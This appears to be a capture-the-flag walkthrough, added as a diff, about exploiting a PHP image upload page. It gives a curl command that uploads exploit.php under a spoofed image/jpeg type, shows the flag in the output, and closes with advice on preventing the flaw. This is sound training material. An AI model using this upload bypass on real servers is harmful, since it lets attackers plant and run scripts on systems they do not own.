@@ -1,0 +1,14 @@
+[ Walkthrough ]
+
+Go to : [IP]/index.php?page=upload
+
+We'll try to upload a script file (exploit.php) instead of a picture.
+While inspecting the page we can see that the file input await a "uploaded" file, and the action on form submit is called "Upload".
+If we try to send a file such as exploit.php.jpeg, the page says that our picture is now uploaded, but there is no flag. Though the POST request answers that it treated with the type "image/jpeg".
+
+With curl, we can try : curl -X POST -F 'uploaded=@/Users/your_username/exploit.php;type=image/jpeg' -F "Upload=Upload" "http://[IP]/index.php?page=upload (-X and POST to send a request of the POST type, -F two times to emulate file input and submit, first to fill the 'uploaded' file input, second to hit the "Upload" button)
+
+Part of the output (in the main section) :
+<pre><center><h2 style="margin-top:50px;">The flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> </pre><pre>/tmp/exploit.php succesfully uploaded.</pre>
+
+How to prevent : always check for file extensions (even .php.jpeg), not just the data type (image/jpeg), and cancel the action in order to prevent hackers from launching a script on your server. Also, never output the path of uploaded files. Instead, store files in the database under a unique id that will be requested by URL (file=l9trx13 for example). 
